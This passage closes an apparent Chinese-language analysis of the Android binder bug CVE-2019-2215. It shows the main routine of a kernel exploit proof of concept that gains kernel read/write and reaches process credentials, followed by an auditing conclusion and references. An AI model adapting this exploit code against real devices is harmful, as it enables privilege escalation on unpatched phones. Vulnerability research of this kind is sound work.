// Linux localhost 4.4.177-g83bee1dc48e8 #1 SMP PREEMPT Mon Jul 22 20:12:03 UTC 2019 aarch64
// data from `pahole` on my own build with the same .config
#define OFFSET__task_struct__mm 0x520
#define OFFSET__task_struct__cred 0x790
#define OFFSET__mm_struct__user_ns 0x300
#define OFFSET__uts_namespace__name__version 0xc7
// SYMBOL_* are relative to _head; data from /proc/kallsyms on userdebug
#define SYMBOL__init_user_ns 0x202f2c8
#define SYMBOL__init_task 0x20257d0
#define SYMBOL__init_uts_ns 0x20255c0

int main(void) {
  printf("Starting POC\n");
  //pin_to(0);

  dummy_page_4g_aligned = mmap((void*)0x100000000UL, 0x2000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  if (dummy_page_4g_aligned != (void*)0x100000000UL)
    err(1, "mmap 4g aligned");
  if (pipe(kernel_rw_pipe)) err(1, "kernel_rw_pipe");

  binder_fd = open("/dev/binder", O_RDONLY);
  epfd = epoll_create(1000);
  leak_task_struct();
  clobber_addr_limit();

  setbuf(stdout, NULL);
  printf("should have stable kernel R/W now\n");

  /* in case you want to do stuff with the creds, to show that you can get them: */
  unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
  printf("current->mm == 0x%lx\n", current_mm);
  unsigned long current_user_ns = kernel_read_ulong(current_mm + OFFSET__mm_struct__user_ns);
  printf("current->mm->user_ns == 0x%lx\n", current_user_ns);
  unsigned long kernel_base = current_user_ns - SYMBOL__init_user_ns;
  printf("kernel base is 0x%lx\n", kernel_base);
  if (kernel_base & 0xfffUL) errx(1, "bad kernel base (not 0x...000)");
  unsigned long init_task = kernel_base + SYMBOL__init_task;
  printf("&init_task == 0x%lx\n", init_task);
  unsigned long init_task_cred = kernel_read_ulong(init_task + OFFSET__task_struct__cred);
  printf("init_task.cred == 0x%lx\n", init_task_cred);
  unsigned long my_cred = kernel_read_ulong(current_ptr + OFFSET__task_struct__cred);
  printf("current->cred == 0x%lx\n", my_cred);

  unsigned long init_uts_ns = kernel_base + SYMBOL__init_uts_ns;
  char new_uts_version[] = "EXPLOITED KERNEL";
  kernel_write(init_uts_ns + OFFSET__uts_namespace__name__version, new_uts_version, sizeof(new_uts_version));
}
```

## 3. Conclusion

CVE-2019-2215的问题在于binder这类提供通过设备文件访问其功能的内核驱动没有处理好其销毁过程中和epoll联动部分\(同步销毁其在epoll中可能存在的引用\)。针对此类问题，可以尝试扩展到其他类似的驱动模块上进行代码审计，审计点在于check是否同样存在没有同步销毁其于epoll中的引用的问题。

## 4. Reference

+ https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html
+ https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
+ https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885
+ https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/